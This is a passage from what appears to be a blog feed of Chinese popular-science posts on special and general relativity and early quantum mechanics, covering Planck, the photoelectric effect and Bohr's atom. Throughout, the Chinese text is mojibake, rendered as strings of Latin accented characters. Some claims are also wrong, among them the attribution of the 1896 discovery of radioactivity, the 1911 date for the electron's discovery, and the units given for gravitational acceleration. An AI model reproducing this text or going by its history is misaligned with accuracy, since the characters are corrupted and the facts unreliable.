åœ¨é£èˆ¹ä¸Šï¼Œæˆ‘åœ¨åœ°é¢ä¸Šã€‚é£èˆ¹ç›¸å¯¹äºåœ°é¢æœ‰ä¸€ä¸ªå¾ˆé«˜çš„é€Ÿåº¦ã€‚ä½†æ˜¯ä½ ååœ¨é£èˆ¹é‡Œï¼Œé£èˆ¹ç›¸å¯¹äºä½ çš„é€Ÿåº¦ä¸º0ã€‚<br>ä½ å¯ä»¥è®©é£èˆ¹åŠ é€Ÿï¼Œä½ ä¼šäº§ç”Ÿæ¨èƒŒæ„Ÿã€‚å¹¶ä¸”ä¸€ç›´ä¿æŒæœ‰æ¨èƒŒæ„Ÿï¼Œé‚£ä¹ˆä½ æ˜¯ä¸æ˜¯ä¼šè§‰å¾—ä½ é€Ÿåº¦è¶Šæ¥è¶Šå¿«ï¼Œéƒ½å¿«åˆ°è¾¾å…‰é€Ÿäº†å‘¢ã€‚<br>ä½†æ˜¯åœ¨åœ°é¢çš„æˆ‘çœ‹æ¥ï¼Œä½ å°±æƒ³æ˜¯ä¸ªæ²¹è…»çš„ä¸­å¹´äººï¼Œè¶Šèµ°è¶Šæ…¢ã€‚</p><p>å°±ç­‰æ•ˆäºä½ çš„è´¨é‡è¶Šæ¥è¶Šé‡ï¼Œæ‰€ä»¥åŠ é€Ÿåº¦è¶Šæ¥è¶Šå°ã€‚</p><ul><li>è¿™å°±æ˜¯ç›¸å¯¹è®ºçš„å¦ä¸€ä¸ªæ•ˆåº”ï¼š<strong>é«˜é€Ÿè¿åŠ¨ç‰©ä½“çš„è´¨é‡ä¼šå˜é‡</strong>ã€‚è´¨é‡å˜é‡çš„å½¢å¼å’Œæ—¶é—´è†¨èƒ€ä¸€æ ·</li></ul><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/52857151.jpg" alt="@m0æ˜¯ç‰©ä½“é™æ­¢æ—¶å€™çš„è´¨é‡ | center | 200*0"></p><p>å¯ä»¥ä»å…¬å¼ä¸­çœ‹å‡ºæ¥ï¼Œå½“é€Ÿåº¦$v$è¶Šæ¥è¿‘$c$ï¼Œåˆ†æ¯å°±è¶Šå°ã€‚æ‰€å¾—åˆ°çš„$m$å°±è¶Šå¤§ã€‚</p><blockquote><p>ç›¸å¯¹è®ºçš„å‡ ä¸ªæ•ˆåº”å¯ä»¥ç”¨ç±»æ¯”è”æƒ³çš„æ–¹å¼è®°å¿†ï¼š <strong>è¿åŠ¨ä¼šè®©ä½ <em>æ›´å¹´è½»</em>ï¼ˆæ—¶é—´è†¨èƒ€ï¼‰ã€<em>å˜ç˜¦</em>ï¼ˆé•¿åº¦æ”¶ç¼©ï¼‰ï¼Œå’Œ<em>å˜ç»“å®</em>ï¼ˆè´¨é‡å˜é‡ï¼‰</strong> </p></blockquote><ul><li><strong>ä¸€åˆ‡æœ‰è´¨é‡çš„ç‰©ä½“éƒ½ä¸å¯èƒ½è¾¾åˆ°å…‰é€Ÿ</strong></li><li>åªæœ‰å…‰å­æ²¡æœ‰è´¨é‡æ‰€ä»¥è¾¾åˆ°äº†å…‰é€Ÿã€‚å®ƒä¸ä¼šå˜è€ï¼Œè¦ä¹ˆè¿åŠ¨ï¼Œè¦ä¹ˆæ¶ˆå¤±ã€‚</li></ul><h3 id="E-mc-2"><a href="#E-mc-2" class="headerlink" title="$E = mc^2$"></a>$E = mc^2$</h3><p>é‚£ä¹ˆç°åœ¨åˆæœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œè¿™äº›å¢åŠ å‡ºæ¥çš„è´¨é‡ï¼Œæ˜¯å¤šåœ¨äº†å“ªé‡Œï¼Ÿ</p><ul><li>çˆ±å› æ–¯å¦äº§ç”Ÿäº†è¿™æ ·çš„ä¸€ä¸ªæ´è§ï¼š <strong>$mc^2$ä»£è¡¨äº†ä¸€ä¸ªç‰©ä½“çš„<em>å…¨éƒ¨èƒ½é‡</em> â€“ å“ªæ€•ä»–é™æ­¢ä¸åŠ¨ï¼Œä¹Ÿæœ‰èƒ½é‡ã€‚</strong><br>è¿™å°±æ˜¯â€œè´¨èƒ½æ–¹ç¨‹â€ã€‚</li><li><strong>ç‰©è´¨å’Œèƒ½é‡æ˜¯ä¸€å›äº‹ã€‚</strong></li></ul><p>è¿™å°±æ˜¯ç‹­ä¹‰ç›¸å¯¹è®º</p><h2 id="å¹¿ä¹‰ç›¸å¯¹è®º"><a href="#å¹¿ä¹‰ç›¸å¯¹è®º" class="headerlink" title="å¹¿ä¹‰ç›¸å¯¹è®º"></a>å¹¿ä¹‰ç›¸å¯¹è®º</h2><h3 id="å¹¿ä¹‰ç›¸å¯¹åŸç†"><a href="#å¹¿ä¹‰ç›¸å¯¹åŸç†" class="headerlink" title="å¹¿ä¹‰ç›¸å¯¹åŸç†"></a>å¹¿ä¹‰ç›¸å¯¹åŸç†</h3><ul><li><strong>åœ¨æ‰€æœ‰åæ ‡ç³»ä¸‹ï¼Œç‰©ç†å®šå¾‹éƒ½æ˜¯ä¸€æ ·çš„ã€‚</strong></li></ul><h3 id="åŠ é€Ÿåº¦å’Œå¼•åŠ›"><a href="#åŠ é€Ÿåº¦å’Œå¼•åŠ›" class="headerlink" title="åŠ é€Ÿåº¦å’Œå¼•åŠ›"></a>åŠ é€Ÿåº¦å’Œå¼•åŠ›</h3><p>æˆ‘ä»¬å¯ä»¥æƒ³è±¡ä¸€ä¸ªè¿™æ ·çš„åœºæ™¯ã€‚<br>ä½ å¤„äºä¸€ä¸ªä¸€ç›´åšåŠ é€Ÿè¿åŠ¨çš„ç«ç®­é‡Œã€‚ ä½ ä¼šæ„Ÿè§‰åˆ°ä¸€ä¸ªåŠ›ï¼Œè¿™ä¸ªåŠ›å‘ä¸‹ã€‚æ­¤æ—¶ä½ æŠ›ä¸€ä¸ªå°çƒï¼Œè¿™ä¸ªå°çƒä¹Ÿä¼šæœç€åœ°é¢çš„æ–¹å‘æ‰è½ã€‚é‚£ä¹ˆè¿™ä¸ªå®éªŒå’Œåœ¨åœ°çƒä¸ŠæŠ›å°çƒé€šè¿‡å¼•åŠ›è½å›åœ°é¢ä¸Šæœ‰åŒºåˆ«å—ï¼Ÿ</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/1225873056.jpg" alt="Alt text | center | 300*0"></p><p>çˆ±å› æ–¯å¦è¯´ï¼Œ<strong>æˆ‘åœ¨ç«ç®­å†…éƒ¨åšå®éªŒï¼Œè§‚æµ‹ä¸åˆ°ä»»ä½•çš„åŒºåˆ«</strong></p><h3 id="è‡ªç”±è½ä½“å’ŒåŒ€é€Ÿç›´çº¿è¿åŠ¨"><a href="#è‡ªç”±è½ä½“å’ŒåŒ€é€Ÿç›´çº¿è¿åŠ¨" class="headerlink" title="è‡ªç”±è½ä½“å’ŒåŒ€é€Ÿç›´çº¿è¿åŠ¨"></a>è‡ªç”±è½ä½“å’ŒåŒ€é€Ÿç›´çº¿è¿åŠ¨</h3><p class='quest'>è‡ªç”±è½ä½“æ˜¯ä¸€ä¸ªåŠ é€Ÿè¿åŠ¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆçˆ±å› æ–¯å¦è¯´å®ƒè·ŸåŒ€é€Ÿç›´çº¿è¿åŠ¨æ²¡æœ‰åŒºåˆ«å‘¢ï¼Ÿ<p class='answer'>**å› ä¸ºè‡ªç”±è½ä½“çŠ¶æ€ä¸‹ç‰©ä½“çš„åŠ é€Ÿåº¦éƒ½æ˜¯ä¸€æ ·çš„ã€‚**<p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨åœ°çƒä¸ŠåŠ é€Ÿåº¦Gæ˜¯ä¸€ä¸ªæ’å®šçš„æ•°å€¼$9.8m/s$<br>åªæœ‰è¿™æ ·ï¼Œä¸¤ä¸ªè´¨é‡ä¸åŒçš„å°çƒæ‰ä¼šåœ¨åŒæ—¶ä¸‹è½çš„æƒ…å†µä¸‹åŒæ—¶åˆ°è¾¾åœ°é¢ã€‚</p><ul><li><strong>åœ¨ä»»ä½•å±€éƒ¨å®éªŒä¸­ï¼Œå¼•åŠ›å’ŒåŠ é€Ÿåº¦è¿åŠ¨æ— æ³•åŒºåˆ†ã€‚</strong></li></ul><h3 id="å¹¿ä¹‰ç›¸å¯¹è®ºçš„ç»“è®º"><a href="#å¹¿ä¹‰ç›¸å¯¹è®ºçš„ç»“è®º" class="headerlink" title="å¹¿ä¹‰ç›¸å¯¹è®ºçš„ç»“è®º"></a>å¹¿ä¹‰ç›¸å¯¹è®ºçš„ç»“è®º</h3><ul><li>ä¸€ä¸ªæœ‰è´¨é‡çš„ç‰©è´¨ï¼Œä¼šå¼¯æ›²å®ƒå‘¨å›´çš„æ—¶ç©ºã€‚è¿™å«<em>â€œç‰©è´¨å‘Šè¯‰æ—¶ç©ºå¦‚ä½•å¼¯æ›²â€</em>ã€‚</li><li>åœ¨ä¸å—å¤–åŠ›çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç‰©ä½“æ€»æ˜¯æ²¿ç€æ—¶ç©ºä¸­çš„æµ‹åœ°çº¿è¿åŠ¨ã€‚è¿™å«<em>â€œæ—¶ç©ºå‘Šè¯‰ç‰©è´¨å¦‚ä½•è¿åŠ¨â€</em>ã€‚ </li></ul><p>è¿™é‡Œé¢ä¸éœ€è¦å¼•åŠ›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç§‘å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç‰©ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡å­åŠ›å­¦</title>
      <link href="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/"/>
      <url>/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>é‡å­åŠ›å­¦æ˜¯æè¿°å¾®è§‚ç²’å­çš„ç‰©è´¨è¡Œä¸ºçš„ç‰©ç†å­¦ç†è®ºï¼Œé‡å­åŠ›å­¦æ˜¯æˆ‘ä»¬ç†è§£é™¤äº†ä¸‡æœ‰å¼•åŠ›ä¹‹å¤–çš„æ‰€æœ‰åŸºæœ¬åŠ›çš„ä¸€ä¸ªåŸºç¡€ã€‚è¿™äº›åŸºæœ¬åŠ›åŒ…æ‹¬äº†ç”µç£ç›¸äº’ä½œç”¨ã€å¼ºç›¸äº’ä½œç”¨å’Œå¼±ç›¸äº’ä½œç”¨ã€‚</p><p>é‡å­åŠ›å­¦ä¸»è¦æ˜¯ç”¨æ¥æè¿°ç²’å­åœ¨å¾®è§‚å°ºåº¦ä¸‹çš„è¡Œä¸ºï¼Œæ‰€æœ‰çš„ç²’å­ç°è±¡æ— æ³•ç”¨ç»å…¸åŠ›å­¦ç²¾ç¡®æè¿°ã€‚</p><p>ä¸ºä»€ä¹ˆè¦äº†è§£ä¸€ä¸‹é‡å­åŠ›å­¦ï¼Ÿ<br>æˆ‘æƒ³ï¼Œå»äº†è§£ä¸€ä¸‹è¿™ä¸ªä¸–ç•Œä¸Šæœ€èªæ˜çš„é‚£ç¾¤äººåœ¨æ€è€ƒäº›ä»€ä¹ˆï¼Œè¿™ä¸ªäº‹æœ¬èº«å°±éå¸¸æœ‰è¶£ã€‚</p><h2 id="é‡å­åŠ›å­¦çš„å‰å¤œ"><a href="#é‡å­åŠ›å­¦çš„å‰å¤œ" class="headerlink" title="é‡å­åŠ›å­¦çš„å‰å¤œ"></a>é‡å­åŠ›å­¦çš„å‰å¤œ</h2><p>åœ¨ç»å…¸åŠ›å­¦å®Œå¤‡çš„æƒ…å†µä¸‹ï¼Œ19ä¸–çºªæœ«äººä»¬æ™®éè®¤ä¸ºç»å…¸ç‰©ç†å·²ç»éå¸¸å®Œå¤‡äº†ï¼Œåªéœ€è¦å†è§£å†³ä¸¤ä¸ªå°å°çš„ä¹Œäº‘å°±å¯ä»¥å°†ç‰©ç†å­¦å¤§å¦å°é¡¶ã€‚åé¢çš„ç‰©ç†å­¦å®¶å†ä¿®ä¿®è¡¥è¡¥ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ä¸¤ä¸ªå°å°çš„ä¹Œäº‘å´æœ‰ç‚¹æ€ªã€‚</p><p>è¿™ä¸¤ä¸ªä¹Œäº‘éƒ½ä¸å…‰æœ‰å…³ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¸ºä»€ä¹ˆå…‰é€Ÿå†ä»»ä½•æ–¹å‘ä¸Šéƒ½ä¿æŒä¸å˜ï¼Œè¿™ä¸ªç›´æ¥å¯¼è‡´äº†çˆ±å› æ–¯å¦å‘ç°äº†ç‹­ä¹‰ç›¸å¯¹è®ºã€‚<br>ç¬¬äºŒä¸ªæ˜¯å…³äºé»‘ä½“è¾å°„ã€‚</p><h3 id="ç´«å¤–ç¾éš¾"><a href="#ç´«å¤–ç¾éš¾" class="headerlink" title="ç´«å¤–ç¾éš¾"></a>ç´«å¤–ç¾éš¾</h3><p>ç´«å¤–ç¾éš¾æ˜¯è¯´ï¼Œç»å…¸ç‰©ç†å­¦è§£é‡Šé»‘ä½“è¾å°„é—®é¢˜ä¸å®éªŒç»“æœä¸ç¬¦çš„å†å²äº‹ä»¶ã€‚</p><p>é»‘ä½“è¾å°„é—®é¢˜ï¼Œé—®çš„æ˜¯é»‘ä½“è¾å°„å¼ºåº¦ä¸èƒ½é‡ä¹‹é—´çš„å…³ç³»ã€‚</p><blockquote><p>æ‰€è°“é»‘ä½“ï¼Œå°±æ˜¯ç‰©ä½“ä¸åå°„å…‰ï¼Œåªä¼šè‡ªèº«å‘å…‰ï¼Œæ¯”å¦‚å¤ªé˜³ï¼Œçƒ§çº¢çš„çƒ™é“</p></blockquote><p>å®éªŒç‰©ç†å­¦å®¶ç»™å‡ºäº†é»‘ä½“è¾å°„å…‰é¢‘ç‡çš„çš„åˆ†å¸ƒæ›²çº¿ï¼Œä½†æ˜¯è¿™ä¸ªæ›²çº¿ä¸ºä»€ä¹ˆæ˜¯è¿™æ ·çš„ï¼Œç†è®ºç‰©ç†å­¦å®¶é€šè¿‡ç»å…¸ç‰©ç†å­¦æ— æ³•è§£é‡Šã€‚</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/20210116123203.jpg"></p><p>è¿™ä¸ªæ—¶å€™ï¼Œæ™®æœ—å…‹å‡ºæ¥äº†ï¼Œä»–é€šè¿‡çº¯æ•°å­¦å‡‘æ•°çš„åŠæ³•ï¼Œå‡‘å‡ºäº†ä¸€ä¸ªå…¬å¼ï¼Œè€Œè¿™ä¸ªå…¬å¼å®Œç¾ç¬¦åˆæ›²çº¿ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªå…¬å¼æ€ä¹ˆè§£é‡Šå‘¢ï¼Œæœ€åå‘ç°ï¼Œåªè¦æ»¡è¶³ä¸€ä¸ªç‰©ç†å‡è®¾ï¼Œå°±å¯ä»¥æ¨å¯¼å‡ºè¿™ä¸ªå…¬å¼ï¼Œé‚£å°±æ˜¯è¦æ±‚æ¯ä¸€ä¸ªç”µå­éœ‡åŠ¨äº§ç”Ÿçš„æ— çº¿ç”µæ³¢çš„çš„èƒ½é‡ä¸æ˜¯è¿ç»­çš„ï¼Œè€Œæ˜¯<strong>ä¸€ä»½ä¸€ä»½</strong>çš„ ã€‚</p><p>$E = nhf$ è¿™é‡Œ n = 1, 2, 3 â€¦<br>å…¶ä¸­$f$æ˜¯é¢‘ç‡ï¼Œ$h$æ˜¯å¸¸æ•°ï¼Œç°åœ¨ç§°ä¸º<strong>æ™®æœ—å…‹å¸¸æ•°</strong>ï¼Œ h=6.626 * 10 ^(-34) ç„¦è€³*ç§’ã€‚</p><p>è¿™æ ·å°±é¿å…äº†ç´«å¤–ç¾éš¾ã€‚</p><p>ä½†æ˜¯æ™®æœ—å…‹å¹¶ä¸æ¸…æ¥šè¿™<strong>ä¸€ä»½ä¸€ä»½</strong>æ„å‘³ç€ä»€ä¹ˆã€‚</p><h3 id="å…‰ç”µæ•ˆåº”"><a href="#å…‰ç”µæ•ˆåº”" class="headerlink" title="å…‰ç”µæ•ˆåº”"></a>å…‰ç”µæ•ˆåº”</h3><p>å…‰ç”µæ•ˆåº”æ˜¯è¯´å…‰æ‰“åˆ°é‡‘å±æ¿ä¸Šä¼šç”±ç”µå­è·‘å‡ºæ¥çš„ç°è±¡ã€‚ç”µå­è·‘å‡ºæ¥å¤šå°‘åªä¸å…‰æ˜¯ä»€ä¹ˆé¢œè‰²çš„ï¼ˆé¢‘ç‡ï¼‰æœ‰å…³ï¼Œè€Œä¸è¿™ä¸ªå…‰çš„å¼ºåº¦æ— å…³ã€‚è¿™ä¸ªå®éªŒä¸ç»å…¸åŠ›å­¦æ˜¯ä¸ç¬¦çš„ï¼Œå› ä¸ºç»å…¸åŠ›å­¦è®¤ä¸ºå¼ºåº¦ç§¯æ”’å¤šäº†ä¹Ÿå¯ä»¥è·‘å‡ºç”µå­æ¥ã€‚</p><p>è¿™æ—¶å€™çˆ±å› æ–¯å¦å‡ºæ¥äº†ï¼Œè¯´è¿™æ˜¯å› ä¸ºå…‰æ˜¯ä¸€ä»½ä¸€ä»½çš„ï¼Œæ™®æœ—å…‹ä¸æ˜¯è¯´äº†ä¹ˆï¼Œå…‰çš„ä¸€ä»½èƒ½é‡æ˜¯$E=hf$ï¼Œé¢‘ç‡è¶Šé«˜èƒ½é‡è¶Šå¤§ï¼Œæ‰€ä»¥é«˜é¢‘ç‡çš„å…‰çš„ä¸€ä»½èƒ½é‡æ‰è¶³å¤Ÿå¤§ï¼Œæ‰èƒ½æ‰“åŠ¨ç”µå­ã€‚</p><p><em>å¯ä»¥æ‰“ä¸€ä¸ªæ¯”æ–¹ï¼Œæ‹¿çŸ³å¤´å»ç ¸å¢™ï¼Œå…‰çš„é¢‘ç‡å°±æ˜¯çŸ³å¤´çš„å¤§å°ï¼Œä½ ç”¨å¤§çŸ³å¤´å»ç ¸å¢™å°±ä¼šæœ‰çŸ³è†æ‰è½ï¼Œä½†æ˜¯ç”¨å°çŸ³å­å´ä¸ä¼šæ‰è½ã€‚</em></p><p>è¿™é‡Œçš„å…³é”®æ˜¯çˆ±å› æ–¯å¦å°†æ™®æœ—å…‹çš„å‡è¯´æ¥äº†ä¸ªæ€ç»´è·ƒè¿ï¼Œè®¤ä¸ºåªè¦æ˜¯å…‰ï¼Œèƒ½é‡å°±æ˜¯ä¸€ä»½ä¸€ä»½çš„ã€‚</p><p>ç”±ç´«å¤–ç¾éš¾å¼•å‘äº†æ™®æœ—å…‹å¯¹é»‘ä½“ä¸­ç”µå­å—çƒ­éœ‡åŠ¨çš„èƒ½é‡æ˜¯ä¸€ä»½ä¸€ä»½çš„æ€è€ƒï¼Œç„¶åç”±çˆ±å› æ–¯å¦æå‡ºäº†ï¼Œ<strong>å…‰é‡å­</strong>ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯é‡å­"><a href="#ä»€ä¹ˆæ˜¯é‡å­" class="headerlink" title="ä»€ä¹ˆæ˜¯é‡å­"></a>ä»€ä¹ˆæ˜¯é‡å­</h3><p>æ™®æœ—å…‹ä¸çˆ±å› æ–¯å¦çš„è§£é¢˜æ€è·¯ï¼Œå«åš<strong>é‡å­åŒ–</strong>ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯é‡å­å‘¢ã€‚</p><p>æ¯”å¦‚é«˜æ¸…ç”µè§†ï¼Œç¦»å¾—è¿œäº†çœ‹éå¸¸ä¸æ»‘ï¼Œä½†æ˜¯è´´ç€çœ‹ä¼šæœ‰ä¸€ä¸ªä¸€ä¸ªçš„æ™¶ä½“ç®¡ï¼Œåˆ†è¾¨ç‡æ˜¯æœ‰æé™çš„ï¼Œç”»é¢ä¸æ˜¯è¿ç»­çš„ï¼Œè¿™ä¸ªå°±æ˜¯é‡å­åŒ–ã€‚</p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬ç”Ÿæ´»ä¸­æ„Ÿå—ä¸åˆ°ä¸–ç•Œæ˜¯é‡å­çš„å‘¢ï¼Œå› ä¸ºæ™®æœ—å…‹å‚æ•°éå¸¸å°ï¼Œæ„Ÿè§‰ä¸åˆ°ã€‚ä¹Ÿå°±æ˜¯åˆ†è¾¨ç‡å¤ªé«˜äº†ã€‚</p><h2 id="ç»å…¸é‡å­åŠ›å­¦"><a href="#ç»å…¸é‡å­åŠ›å­¦" class="headerlink" title="ç»å…¸é‡å­åŠ›å­¦"></a>ç»å…¸é‡å­åŠ›å­¦</h2><h3 id="åŸå­çš„å†…éƒ¨ç»“æ„"><a href="#åŸå­çš„å†…éƒ¨ç»“æ„" class="headerlink" title="åŸå­çš„å†…éƒ¨ç»“æ„"></a>åŸå­çš„å†…éƒ¨ç»“æ„</h3><p>ã€Šåº„å­ã€‹ä¸­æœ‰å¥è¯ï¼šâ€œä¸€å°ºä¹‹æ£°ï¼Œæ—¥å–å…¶åŠï¼Œä¸‡ä¸–ä¸ç«­â€ï¼Œè¿™å¥è¯åœ¨ç‰©ç†ä¸Šæ˜¯é”™çš„ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œåˆ†å­æ˜¯ç”±åŸå­ç»„æˆçš„ï¼ŒåŸå­æ˜¯ç”±åŸå­æ ¸å’Œç”µå­ç»„æˆçš„ï¼ŒåŸå­æ ¸æ˜¯ç”±è´¨å­å’Œä¸­å­ç»„æˆçš„ï¼Œè´¨å­å’Œä¸­å­åˆæ˜¯ç”±å¤¸å…‹ç»„æˆçš„ã€‚ä½†æ˜¯å¤¸å…‹æ˜¯ç”±ä»€ä¹ˆç»„æˆçš„å‘¢ï¼Ÿ ç°ä»£ç‰©ç†å­¦çš„æ ‡å‡†æ¨¡å‹è®¤ä¸ºï¼Œå¤¸å…‹å’Œç”µå­ä¸º<strong>åŸºæœ¬ç²’å­</strong>ï¼Œæ˜¯ä¸å¯å†åˆ†çš„ã€‚</p><p>å°±æ¯”å¦‚ä¸€æœ¬ä¹¦ï¼Œä½ å¯ä»¥åˆ†ä¸ºç« èŠ‚ï¼Œæ®µè½ï¼Œå¥å­ï¼Œè¯ï¼Œå­—ï¼Œä½†æ˜¯å­—å°±ä¸å¯å†åˆ†äº†ï¼Œå› ä¸ºä»–ä»¬æ˜¯æŠ½è±¡æ¦‚å¿µï¼Œæ— éœ€å†åˆ†ã€‚</p><p>è€Œç‰©è´¨æ€ä¹ˆåˆ†ï¼Œæ­£æ˜¯é‡å­åŠ›å­¦çš„å¼€å§‹ã€‚</p><p>1896å¹´ï¼Œå±…é‡Œå¤«äººå‘ç°é“€åŸå­èƒ½æ‰§æ³•çš„å¾€å¤–å‘å°„æŸç§å°„çº¿ï¼Œè¿™ä¸ªç°è±¡è¢«ç§°ä¸ºâ€å‘å°„æ€§â€œï¼Œå¹¶ç¡®å®šè¿™ä¸ªååº”ä¸æ˜¯åŸå­ä¸åŸå­ä¹‹é—´å‘ç”Ÿçš„ï¼Œè€Œæ˜¯ç”±åŸå­è‡ªèº«å‘å‡ºçš„ï¼Œç”±æ­¤æ¨æ–­<strong>åŸå­å†…éƒ¨è¿˜æœ‰ç»“æ„</strong></p><h3 id="æ³¢å°”çš„åŸå­æ¨¡å‹"><a href="#æ³¢å°”çš„åŸå­æ¨¡å‹" class="headerlink" title="æ³¢å°”çš„åŸå­æ¨¡å‹"></a>æ³¢å°”çš„åŸå­æ¨¡å‹</h3><p>1911å¹´ï¼Œæ±¤å§†ç”Ÿé¢†å¯¼çš„ä¸€ä¸ªç ”ç©¶å°ç»„å‘ç°äº†ä¸€ç§å¸¦ç€ä¸€ä¸ªå•ä½è´Ÿç”µè·ä¸”è´¨é‡æå°çš„åŸºæœ¬ç²’å­å¹¶æŠŠå®ƒå‘½åä¸ºç”µå­ã€‚</p><p>å¢ç‘Ÿç¦å’Œå…¶å­¦ç”Ÿé€šè¿‡é‡‘ç®”å®éªŒï¼Œç‰©ç†å­¦å®¶è®¤è¯†åˆ°ç‰©è´¨çš„å†…éƒ¨å‡ ä¹æ˜¯çœŸç©ºçš„ï¼ŒåŸå­æ ¸åªå äº†åŸå­å¾ˆå°çš„ä¸€éƒ¨åˆ†ã€‚</p><blockquote><p>é‡‘ç®”å®éªŒï¼šå®éªŒæ˜¯ç”¨Î±ç²’å­è½°å‡»å„ç§é‡‘å±ç®”çº¸ï¼Œå‘ç°ç»å¤§å¤šæ•°Î±ç²’å­çš„åå‘å¾ˆå°ï¼Œä½†å°‘æ•°çš„åå‘è§’å¾ˆå¤§ç”šè‡³å¤§äº90åº¦ã€‚ç”±æ­¤å¯ä»¥è¯æ˜ï¼Œä¸€ä¸ªåŸå­å¤§éƒ¨åˆ†çš„ä½“ç§¯æ˜¯ç©ºçš„ç©ºé—´ï¼Œè¿™ç”±æ²¡æœ‰è¢«å¼¹å›çš„ç²’å­å……åˆ†è¯´æ˜ã€‚</p></blockquote><blockquote><p>è¿™ä¸ªå®éªŒæ¨ç¿»äº†çº¦ç‘Ÿå¤«Â·æ±¤å§†å­™åˆ›å»ºçš„æ±¤å§†å­™æ¨¡å‹ ã€‚æ ¹æ®è¿™æ¨¡å‹ï¼ŒåŸå­æ˜¯ç”±ç”µå­æ‚¬æµ®äºå‡åŒ€åˆ†å¸ƒçš„å¸¦æ­£ç”µç‰©è´¨é‡Œæ‰€ç»„æˆã€‚è¿™ä¸ªå®éªŒä¸ºå»ºç«‹ç°ä»£åŸå­æ ¸ç†è®ºæ‰“ä¸‹äº†åšå®åŸºç¡€ã€‚</p></blockquote><p>å¢ç‘Ÿç¦çš„æ¨¡å‹æ˜¯ç”µå­å›´ç»•åœ¨åŸå­æ ¸å‘¨å›´ï¼Œä½†æ˜¯ç°åœ¨ç”±ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>ç”µå­æ˜¯å¦‚ä½•ä¿æŒç¨³å®šè½¨é“çš„ï¼Ÿ</li><li>åŸå­çš„ç¡®ä¼šå¯¹å¤–è¾å°„ï¼Œè€Œä¸å—å¹²æ‰°ä¹Ÿä¼šè¾å°„ï¼Œä½†æ˜¯åŸå­è¾å°„çš„å…‰è°±å¾ˆç‹¬ç‰¹ï¼Œä¸æ˜¯è¿ç»­çš„ã€‚</li></ol><p>æ¥ä¸‹æ¥æ³¢å°”ç™»åœºã€‚</p><p> æ³¢å°”æƒ³åˆ°äº†æ™®æœ—å…‹å’Œçˆ±å› æ–¯å¦çš„è§£é¢˜æ€è·¯ï¼Œé‡å­åŒ–ã€‚æ‰€ä»¥å†³å®šå¯¹ç”µå­çš„è½¨é“é‡å­åŒ–ã€‚å¹¶æå‡º4ä¸ªå‡è®¾ï¼š</p><ol><li>ç”µå­å¹³æ—¶æŒ‰ç…§ç‰¹å®šçš„è½¨é“è¿åŠ¨ï¼Œæ¯ä¸ªè½¨é“ç”±è‡ªå·±çš„èƒ½çº§ï¼Œèƒ½çº§å’Œâ€œè½¨é“é‡å­æ•°â€æˆåæ¯”</li><li>ç”µå­åœ¨åŒä¸€ä¸ªè½¨é“ä¸­è¿åŠ¨æ—¶ï¼Œå¹¶ä¸å‘å¤–è¾å°„èƒ½é‡ã€‚</li><li>åªæœ‰å½“ç”µå­åœ¨ä¸¤ä¸ªä¸åŒèƒ½çº§ä¹‹é—´è·ƒè¿çš„æ—¶å€™ï¼Œå®ƒæ‰ä¼šè¾å°„èƒ½é‡ã€‚</li><li>ç”µå­è½¨é“æœ‰ä¸ªè§’åŠ¨é‡ï¼Œè§’åŠ¨é‡ä¹Ÿè¦é‡å­åŒ–ã€‚</li></ol><p>è¿™ä¸ªæ¨¡å‹éå¸¸æˆåŠŸï¼Œå…‰ç”µæ•ˆåº”ä¸æ˜¯è¯´å¤–æ¥ä¸€ä¸ªé«˜èƒ½é‡çš„å…‰å­èƒ½æŠŠç”µå­æ‰“é£ä¹ˆï¼Œéœ€è¦å¤šå¤§çš„èƒ½é‡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æ­£å¥½æ˜¯é‚£ä¸ªç”µå­æ‰€åœ¨èƒ½çº§çš„èƒ½é‡ã€‚</p><p>æ³¢å°”è¿˜èƒ½æ˜æ˜ç™½ç™½åœ°å‘Šè¯‰ä½ åŸå­ä¸­å¦‚æœæœ‰å¤šå°‘ä¸ªç”µå­ï¼Œé‚£ä¹ˆä»–ä»¬å°†å¦‚ä½•æ’åˆ—ï¼Œæ³¢å°”ç­‰äºè§£é‡Šäº†æ•´ä¸ªåŒ–å­¦ã€‚</p><h3 id="æ³¢ç²’äºŒè±¡æ€§"><a href="#æ³¢ç²’äºŒè±¡æ€§" class="headerlink" title="æ³¢ç²’äºŒè±¡æ€§"></a>æ³¢ç²’äºŒè±¡æ€§</h3><p>ä»€ä¹ˆä¸œè¥¿å³æ˜¯æ³¢åˆæ˜¯ç²’å­ï¼Œè¿™å°±å«â€œæ³¢ç²’äºŒè±¡æ€§â€ã€‚æˆ‘ä»¬ä»”ç»†æƒ³æƒ³ï¼Œè¿™ä¸ªä¸œè¥¿ä¼šæœ‰ä»€ä¹ˆæ ·çš„è¡Œä¸ºã€‚</p><p>å¦‚æœç”µå­æ˜¯ä¸€ä¸ªç‚¹ï¼Œé‚£ä¹ˆå®ƒå¦‚ä½•å±•ç°â€æ³¢åŠ¨â€œçš„ç‰¹æ€§å‘¢ï¼Ÿå®ƒæ˜¯ä¸èƒ½èµ°â€ä¹‹â€œå­—å‹è·¯çº¿çš„ï¼Œå› 